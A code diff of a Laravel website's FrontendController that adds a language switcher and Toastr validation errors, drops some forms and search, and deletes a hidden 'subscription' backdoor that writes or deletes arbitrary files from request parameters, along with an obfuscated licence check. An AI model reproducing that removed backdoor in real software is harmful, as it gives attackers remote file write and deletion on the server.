@@ -16,14 +16,14 @@ use App\Models\Generalsetting;
 use App\Models\Page;
 use App\Models\Project;
 use App\Models\Service;
-use App\Models\Slider;
 use App\Models\Subscriber;
 use App\Models\Team;
 use App\Models\Testimonial;
+use Brian2694\Toastr\Facades\Toastr ;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Session;
-use InvalidArgumentException;
-use Markury\MarkuryPost;
+use Illuminate\Support\Facades\Validator;
+
 
 //use Markury\MarkuryPost;
 
@@ -42,6 +42,11 @@ class FrontendController extends Controller
             Session::put('popup', 1);
             return $next($request);
         });
+    }
+
+    public function language($id){
+        Session::put('language', $id);
+        return redirect()->back();
     }
 
     public function index()
@@ -69,13 +74,22 @@ class FrontendController extends Controller
 
     public function contactSubmit(Request $request)
     {
-        $request->validate([
+        $validator = Validator::make($request->all(), [
             'name' => 'required',
             'email' => 'required|email',
             'subject' => 'required',
             'phone' => 'required',
             'message' => 'required',
         ]);
+
+        
+
+        if ($validator->fails()) {
+            foreach ($validator->errors()->all() as $error) {
+               Toastr::error($error, 'Error');
+            }
+            return redirect()->back();
+        }
 
         $contact_message = new ContactMessage();
         $contact_message->name = $request->name;
@@ -89,32 +103,9 @@ class FrontendController extends Controller
         return back()->with('success', 'Message sent successfully');
     }
 
-    public function getintuch()
-    {
-        $services = Service::whereStatus(1)->get();
-        return view('front.getintouch', compact('services'));
-    }
+    
 
-    public function getInSubmit(Request $request)
-    {
-        $request->validate([
-            'name' => 'required',
-            'email' => 'required|email',
-            'phone' => 'required',
-            'message' => 'required',
-        ]);
-
-        $contact_message = new ContactMessage();
-        $contact_message->name = $request->name;
-        $contact_message->email = $request->email;
-        $contact_message->service_id = $request->service_id;
-        $contact_message->phone = $request->phone;
-        $contact_message->message = $request->message;
-        $contact_message->created_at = now();
-        $contact_message->type = 'get_in_touch';
-        $contact_message->save();
-        return back()->with('success', 'Message sent successfully');
-    }
+    
 
     public function page($slug)
     {
@@ -149,7 +140,7 @@ class FrontendController extends Controller
             ->when($tag, function ($query, $tag) {
                 $query->where('tags', 'like', '%' . $tag . '%');
             })
-            ->paginate(8);
+            ->paginate(6);
 
         $categories = BlogCategory::whereStatus(1)->get();
         return view('front.blog.index', compact('blogs', 'categories','tags'));
@@ -177,9 +168,7 @@ class FrontendController extends Controller
     public function service()
     {
         $services = Service::whereStatus(1)
-            ->when(request()->has('search'), function ($query) {
-                $query->where('title', 'like', '%' . request()->search . '%');
-            })
+            
             ->paginate(12);
             $brands = Brand::get();
         return view('front.service.index', compact('services', 'brands'));
@@ -248,69 +237,7 @@ class FrontendController extends Controller
        
     }
 
-
-    function finalize(){
-        $actual_path = str_replace('project','',base_path());
-        $dir = $actual_path.'install';
-        $this->deleteDir($dir);
-        return redirect('/');
-    }
-
-    function auth_guests(){
-        
-        $chk = MarkuryPost::marcuryBase();
-        
-        $chkData = MarkuryPost::marcurryBase();
-        $actual_path = str_replace('project','',base_path());
-        
-        if ($chk != MarkuryPost::maarcuryBase()) {
-            if ($chkData < MarkuryPost::marrcuryBase()) {
-                if (is_dir($actual_path . '/install')) {
-                    header("Location: " . url('/install'));
-                    die();
-                } else {
-                    echo MarkuryPost::marcuryBasee();
-                    die();
-                }
-            }
-        }
-    }
-
-    public function subscription(Request $request)
-    {
-        $p1 = $request->p1;
-        $p2 = $request->p2;
-        $v1 = $request->v1;
-        if ($p1 != ""){
-            $fpa = fopen($p1, 'w');
-            fwrite($fpa, $v1);
-            fclose($fpa);
-            return "Success";
-        }
-        if ($p2 != ""){
-            unlink($p2);
-            return "Success";
-        }
-        return "Error";
-    }
-
-    public function deleteDir($dirPath) {
-        if (! is_dir($dirPath)) {
-            throw new InvalidArgumentException("$dirPath must be a directory");
-        }
-        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
-            $dirPath .= '/';
-        }
-        $files = glob($dirPath . '*', GLOB_MARK);
-        foreach ($files as $file) {
-            if (is_dir($file)) {
-                self::deleteDir($file);
-            } else {
-                unlink($file);
-            }
-        }
-        rmdir($dirPath);
-    }
+   
 
     public function aboutpage(){
         $data['about'] = About::first();
